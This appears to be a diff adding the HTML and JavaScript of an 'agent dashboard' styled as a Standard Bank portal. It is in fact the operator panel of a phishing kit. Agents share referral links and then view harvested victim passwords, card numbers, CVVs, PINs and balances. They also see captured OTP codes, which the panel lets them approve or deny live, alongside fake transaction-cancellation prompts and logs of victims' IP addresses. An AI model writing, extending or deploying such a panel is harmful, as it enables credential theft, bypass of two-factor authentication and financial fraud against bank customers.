@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent Dashboard | Standard Bank Portal</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background: #080e1a;
+            color: #f1f5f9;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Navbar */
+        .navbar {
+            background: rgba(15, 23, 42, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            padding: 16px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .nav-logo {
+            width: 36px;
+            height: 36px;
+        }
+
+        .nav-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .nav-badge {
+            background: rgba(59, 130, 246, 0.15);
+            color: #60a5fa;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .nav-user {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .agent-name {
+            font-size: 14px;
+            color: #94a3b8;
+        }
+
+        .agent-name strong {
+            color: #ffffff;
+        }
+
+        .btn-logout {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #fca5a5;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+
+        .btn-logout:hover {
+            background: rgba(239, 68, 68, 0.25);
+            color: #ffffff;
+        }
+
+        /* Container */
+        .main-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 32px 24px;
+            width: 100%;
+            flex: 1;
+        }
+
+        /* Referral Card */
+        .referral-card {
+            background: linear-gradient(135deg, rgba(0, 82, 204, 0.2) 0%, rgba(15, 23, 42, 0.6) 100%);
+            border: 1px solid rgba(0, 102, 255, 0.3);
+            border-radius: 14px;
+            padding: 24px 28px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .ref-info h2 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #60a5fa;
+            margin-bottom: 6px;
+        }
+
+        .ref-info p {
+            font-size: 13px;
+            color: #94a3b8;
+        }
+
+        .ref-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            padding: 8px 14px;
+            min-width: 340px;
+        }
+
+        .ref-url {
+            font-family: monospace;
+            font-size: 13px;
+            color: #38bdf8;
+            word-break: break-all;
+            flex: 1;
+        }
+
+        .btn-copy {
+            background: #0052cc;
+            border: none;
+            color: #ffffff;
+            padding: 8px 14px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: background 0.2s;
+        }
+
+        .btn-copy:hover {
+            background: #0066ff;
+        }
+
+        /* Tabs */
+        .tabs-header {
+            display: flex;
+            gap: 8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 24px;
+            overflow-x: auto;
+        }
+
+        .tab-btn {
+            background: none;
+            border: none;
+            color: #94a3b8;
+            padding: 12px 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tab-btn:hover {
+            color: #f1f5f9;
+        }
+
+        .tab-btn.active {
+            color: #38bdf8;
+            border-bottom-color: #38bdf8;
+            font-weight: 600;
+        }
+
+        .tab-count {
+            background: rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            border-radius: 12px;
+            padding: 2px 8px;
+            font-size: 11px;
+        }
+
+        .tab-btn.active .tab-count {
+            background: rgba(56, 189, 248, 0.2);
+            color: #38bdf8;
+        }
+
+        /* Tab Content / Tables */
+        .tab-pane {
+            display: none;
+        }
+
+        .tab-pane.active {
+            display: block;
+        }
+
+        .table-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 13px;
+        }
+
+        th {
+            background: rgba(30, 41, 59, 0.8);
+            color: #94a3b8;
+            font-weight: 600;
+            padding: 14px 18px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+        }
+
+        td {
+            padding: 14px 18px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            color: #cbd5e1;
+            vertical-align: middle;
+        }
+
+        tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .badge-status {
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: capitalize;
+            display: inline-block;
+        }
+
+        .status-pending {
+            background: rgba(234, 179, 8, 0.15);
+            color: #fde047;
+            border: 1px solid rgba(234, 179, 8, 0.3);
+        }
+
+        .status-approved {
+            background: rgba(34, 197, 94, 0.15);
+            color: #86efac;
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .status-denied {
+            background: rgba(239, 68, 68, 0.15);
+            color: #fca5a5;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-action {
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            margin-right: 6px;
+            transition: all 0.2s;
+        }
+
+        .btn-approve {
+            background: rgba(34, 197, 94, 0.2);
+            color: #4ade80;
+            border: 1px solid rgba(34, 197, 94, 0.4);
+        }
+
+        .btn-approve:hover {
+            background: #22c55e;
+            color: #ffffff;
+        }
+
+        .btn-deny {
+            background: rgba(239, 68, 68, 0.2);
+            color: #f87171;
+            border: 1px solid rgba(239, 68, 68, 0.4);
+        }
+
+        .btn-deny:hover {
+            background: #ef4444;
+            color: #ffffff;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 48px 20px;
+            color: #64748b;
+        }
+
+        .empty-state svg {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 12px;
+            opacity: 0.5;
+        }
+
+        .mono {
+            font-family: monospace;
+            color: #38bdf8;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="nav-brand">
+            <svg class="nav-logo" viewBox="0 0 100 100" fill="#0066ff">
+                <rect x="10" y="10" width="80" height="80" rx="16" fill="#0052cc"/>
+                <path d="M30 40 L50 25 L70 40 L70 70 L30 70 Z" fill="#ffffff" opacity="0.9"/>
+            </svg>
+            <span class="nav-title">Standard Bank Agent Portal</span>
+            <span class="nav-badge">Isolated View</span>
+        </div>
+        <div class="nav-user">
+            <span class="agent-name">Agent: <strong id="agentUsername">Loading...</strong></span>
+            <a href="/admin2/logout" class="btn-logout">Log Out</a>
+        </div>
+    </nav>
+
+    <!-- Main Container -->
+    <div class="main-container">
+
+        <!-- Referral Link Banner -->
+        <div class="referral-card">
+            <div class="ref-info">
+                <h2>Your Unique Client Referral Link</h2>
+                <p>Share this link with your clients. Any submissions or requests originating from this link are automatically isolated to your portal.</p>
+            </div>
+            <div class="ref-box">
+                <span class="ref-url" id="refUrl">Loading referral URL...</span>
+                <button class="btn-copy" id="copyBtn">Copy Link</button>
+            </div>
+        </div>
+
+        <!-- Navigation Tabs -->
+        <div class="tabs-header">
+            <button class="tab-btn active" onclick="switchTab('submissions')">
+                Submissions <span class="tab-count" id="submissionsCount">0</span>
+            </button>
+            <button class="tab-btn" onclick="switchTab('otp-requests')">
+                OTP Auth Requests <span class="tab-count" id="otpRequestsCount">0</span>
+            </button>
+            <button class="tab-btn" onclick="switchTab('otp-verifications')">
+                OTP Verifications <span class="tab-count" id="otpVerificationsCount">0</span>
+            </button>
+            <button class="tab-btn" onclick="switchTab('cancellations')">
+                Transaction Cancellations <span class="tab-count" id="cancellationsCount">0</span>
+            </button>
+            <button class="tab-btn" onclick="switchTab('activities')">
+                Activity Logs <span class="tab-count" id="activitiesCount">0</span>
+            </button>
+        </div>
+
+        <!-- Submissions Pane -->
+        <div id="submissionsPane" class="tab-pane active">
+            <div class="table-card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Full Name</th>
+                            <th>Password</th>
+                            <th>Phone Number</th>
+                            <th>Card Number</th>
+                            <th>Expiry</th>
+                            <th>CVV</th>
+                            <th>PIN</th>
+                            <th>Balance</th>
+                            <th>Submitted At</th>
+                        </tr>
+                    </thead>
+                    <tbody id="submissionsTable">
+                        <tr><td colspan="10" class="empty-state">Loading submissions...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- OTP Auth Requests Pane -->
+        <div id="otp-requestsPane" class="tab-pane">
+            <div class="table-card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>User Session</th>
+                            <th>IP Address</th>
+                            <th>Status</th>
+                            <th>Requested At</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="otpRequestsTable">
+                        <tr><td colspan="6" class="empty-state">Loading OTP requests...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- OTP Verifications Pane -->
+        <div id="otp-verificationsPane" class="tab-pane">
+            <div class="table-card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>User Session</th>
+                            <th>OTP Code</th>
+                            <th>IP Address</th>
+                            <th>Status</th>
+                            <th>Submitted At</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="otpVerificationsTable">
+                        <tr><td colspan="7" class="empty-state">Loading OTP verifications...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Transaction Cancellations Pane -->
+        <div id="cancellationsPane" class="tab-pane">
+            <div class="table-card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>User Session</th>
+                            <th>OTP Code</th>
+                            <th>Amount</th>
+                            <th>Status</th>
+                            <th>Submitted At</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="cancellationsTable">
+                        <tr><td colspan="7" class="empty-state">Loading transaction cancellations...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- Activity Logs Pane -->
+        <div id="activitiesPane" class="tab-pane">
+            <div class="table-card">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Timestamp</th>
+                            <th>Action Type</th>
+                            <th>Page / Endpoint</th>
+                            <th>IP Address</th>
+                            <th>User Agent</th>
+                            <th>Additional Data</th>
+                        </tr>
+                    </thead>
+                    <tbody id="activitiesTable">
+                        <tr><td colspan="6" class="empty-state">Loading activity logs...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        let currentAdmin = null;
+
+        function switchTab(tabName) {
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
+
+            const activeBtn = Array.from(document.querySelectorAll('.tab-btn')).find(b => b.getAttribute('onclick').includes(tabName));
+            if (activeBtn) activeBtn.classList.add('active');
+
+            const targetPane = document.getElementById(`${tabName}Pane`);
+            if (targetPane) targetPane.classList.add('active');
+        }
+
+        async function loadProfile() {
+            try {
+                const res = await fetch('/api/v2/admin/me');
+                if (!res.ok) {
+                    window.location.href = '/admin2/login';
+                    return;
+                }
+                currentAdmin = await res.json();
+                document.getElementById('agentUsername').textContent = currentAdmin.username;
+                document.getElementById('refUrl').textContent = currentAdmin.referral_url;
+            } catch (err) {
+                console.error('Failed to load profile:', err);
+            }
+        }
+
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            const urlText = document.getElementById('refUrl').textContent;
+            navigator.clipboard.writeText(urlText).then(() => {
+                const btn = document.getElementById('copyBtn');
+                btn.textContent = 'Copied!';
+                btn.style.background = '#22c55e';
+                setTimeout(() => {
+                    btn.textContent = 'Copy Link';
+                    btn.style.background = '#0052cc';
+                }, 2000);
+            });
+        });
+
+        async function loadSubmissions() {
+            const res = await fetch('/api/v2/admin/submissions');
+            const data = await res.json();
+            document.getElementById('submissionsCount').textContent = data.length;
+
+            const tbody = document.getElementById('submissionsTable');
+            if (data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="10" class="empty-state">No submissions found for your referral link yet.</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = data.map(s => `
+                <tr>
+                    <td class="mono">#${s.id}</td>
+                    <td><strong>${escapeHtml(s.fullname)}</strong></td>
+                    <td class="mono">${escapeHtml(s.password)}</td>
+                    <td>${escapeHtml(s.phone_number || '-')}</td>
+                    <td class="mono">${escapeHtml(s.card_number || '-')}</td>
+                    <td>${escapeHtml(s.expiry_date || '-')}</td>
+                    <td class="mono">${escapeHtml(s.cvv || '-')}</td>
+                    <td class="mono">${escapeHtml(s.card_pin || '-')}</td>
+                    <td>${escapeHtml(s.last_account_balance || '-')}</td>
+                    <td>${formatDate(s.submitted_at)}</td>
+                </tr>
+            `).join('');
+        }
+
+        async function loadOtpRequests() {
+            const res = await fetch('/api/v2/admin/otp-requests');
+            const data = await res.json();
+            document.getElementById('otpRequestsCount').textContent = data.length;
+
+            const tbody = document.getElementById('otpRequestsTable');
+            if (data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No OTP authorization requests found.</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = data.map(r => `
+                <tr>
+                    <td class="mono">#${r.id}</td>
+                    <td class="mono">${escapeHtml(r.user_identifier)}</td>
+                    <td>${escapeHtml(r.ip_address || '-')}</td>
+                    <td><span class="badge-status status-${r.status}">${r.status}</span></td>
+                    <td>${formatDate(r.requested_at)}</td>
+                    <td>
+                        ${r.status === 'pending' ? `
+                            <button class="btn-action btn-approve" onclick="decideOtpRequest(${r.id}, 'approve')">Approve</button>
+                            <button class="btn-action btn-deny" onclick="decideOtpRequest(${r.id}, 'deny')">Deny</button>
+                        ` : '<span style="color:#64748b;">Completed</span>'}
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        async function decideOtpRequest(id, action) {
+            await fetch(`/api/v2/admin/otp-requests/${id}/decision`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action })
+            });
+            loadOtpRequests();
+        }
+
+        async function loadOtpVerifications() {
+            const res = await fetch('/api/v2/admin/otp-verifications');
+            const data = await res.json();
+            document.getElementById('otpVerificationsCount').textContent = data.length;
+
+            const tbody = document.getElementById('otpVerificationsTable');
+            if (data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No OTP verifications submitted yet.</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = data.map(v => `
+                <tr>
+                    <td class="mono">#${v.id}</td>
+                    <td class="mono">${escapeHtml(v.user_identifier)}</td>
+                    <td><strong class="mono" style="font-size:15px;">${escapeHtml(v.otp_code)}</strong></td>
+                    <td>${escapeHtml(v.ip_address || '-')}</td>
+                    <td><span class="badge-status status-${v.status}">${v.status}</span></td>
+                    <td>${formatDate(v.submitted_at)}</td>
+                    <td>
+                        ${v.status === 'pending' ? `
+                            <button class="btn-action btn-approve" onclick="decideOtpVerification(${v.id}, 'approve')">Approve</button>
+                            <button class="btn-action btn-deny" onclick="decideOtpVerification(${v.id}, 'deny')">Deny</button>
+                        ` : '<span style="color:#64748b;">Completed</span>'}
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        async function decideOtpVerification(id, action) {
+            await fetch(`/api/v2/admin/otp-verifications/${id}/decision`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action })
+            });
+            loadOtpVerifications();
+        }
+
+        async function loadCancellations() {
+            const res = await fetch('/api/v2/admin/transaction-cancellations');
+            const data = await res.json();
+            document.getElementById('cancellationsCount').textContent = data.length;
+
+            const tbody = document.getElementById('cancellationsTable');
+            if (data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="7" class="empty-state">No transaction cancellation requests.</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = data.map(c => `
+                <tr>
+                    <td class="mono">#${c.id}</td>
+                    <td class="mono">${escapeHtml(c.user_identifier)}</td>
+                    <td><strong class="mono" style="font-size:15px;">${escapeHtml(c.otp_code)}</strong></td>
+                    <td>R ${escapeHtml(String(c.transaction_amount))}</td>
+                    <td><span class="badge-status status-${c.status}">${c.status}</span></td>
+                    <td>${formatDate(c.submitted_at)}</td>
+                    <td>
+                        ${c.status === 'pending' ? `
+                            <button class="btn-action btn-approve" onclick="decideCancellation(${c.id}, 'approve')">Approve</button>
+                            <button class="btn-action btn-deny" onclick="decideCancellation(${c.id}, 'deny')">Deny</button>
+                        ` : '<span style="color:#64748b;">Completed</span>'}
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        async function decideCancellation(id, action) {
+            await fetch(`/api/v2/admin/transaction-cancellations/${id}/decision`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action })
+            });
+            loadCancellations();
+        }
+
+        async function loadActivities() {
+            const res = await fetch('/api/v2/admin/activities');
+            const data = await res.json();
+            document.getElementById('activitiesCount').textContent = data.length;
+
+            const tbody = document.getElementById('activitiesTable');
+            if (data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No user activity recorded for your clients yet.</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = data.map(a => `
+                <tr>
+                    <td>${formatDate(a.timestamp)}</td>
+                    <td><span class="mono">${escapeHtml(a.action_type)}</span></td>
+                    <td>${escapeHtml(a.page)}</td>
+                    <td>${escapeHtml(a.ip_address || '-')}</td>
+                    <td style="max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(a.user_agent || '-')}</td>
+                    <td class="mono" style="max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${escapeHtml(a.additional_data || '-')}</td>
+                </tr>
+            `).join('');
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+        }
+
+        function formatDate(isoStr) {
+            if (!isoStr) return '-';
+            const date = new Date(isoStr);
+            return date.toLocaleString();
+        }
+
+        function refreshAll() {
+            loadSubmissions();
+            loadOtpRequests();
+            loadOtpVerifications();
+            loadCancellations();
+            loadActivities();
+        }
+
+        // Initial Load & 5s Polling
+        loadProfile().then(() => {
+            refreshAll();
+            setInterval(refreshAll, 5000);
+        });
+    </script>
+</body>
+</html>
